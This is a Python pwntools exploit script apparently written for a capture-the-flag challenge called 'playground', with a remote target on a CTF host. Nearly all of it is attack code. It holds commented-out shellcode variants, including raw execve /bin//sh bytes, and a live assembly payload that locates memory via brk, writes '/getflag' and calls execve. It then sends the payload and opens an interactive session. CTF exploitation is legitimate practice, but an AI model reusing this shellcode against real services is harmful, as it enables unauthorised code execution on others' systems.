from pwn import *
from icecream import ic

elf = exe = ELF("./playground")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'x86-64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("playtime.squ1rrel-ctf-codelab.kctf.cloud", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001767

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# payload = asm('''mov rax, 59
# lea rdi, [rip+binsh]
# mov rsi, 0
# mov rdx, 0
# syscall
# binsh:
#     .string "/getflag"
# ''')
# payload = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

# payload = b'\xfe\xc4\x48\x99\x48\xbf\x2F\x67\x65\x74\x66\x6C\x61\x67\x49\x89\xd0\x49\x89\xd2H1\xf6H1\xe4H\x89\xfeH1\xff'
# payload += b'H\xc7\xc6\x0f\xe1\r\x0c'
# payload += b'H\xbf\xff\xff\xff\xff\xff\xff\xff\xff'
# payload += b'\x0f\x05'

payload = asm("""
    mov rdi, 0x0
    mov rax, 0x0c
    syscall

    mov rbx, 0x1c020
    sub rax, rbx
    mov rcx, QWORD PTR [rax]
    mov rax, rcx

    mov rdx, 0x67616c667465672f
    mov [rax], rdx
    add rax, 0x8
    xor rdx, rdx
    mov [rax], rdx

    sub rax, 0x8
    mov rdi, rax
    mov rax, 0x3b
    xor rsi, rsi
    syscall
""")

payload += b'getflag\x00'
ru("The playground is yours. How do you like to play?")
sl(payload)
i()
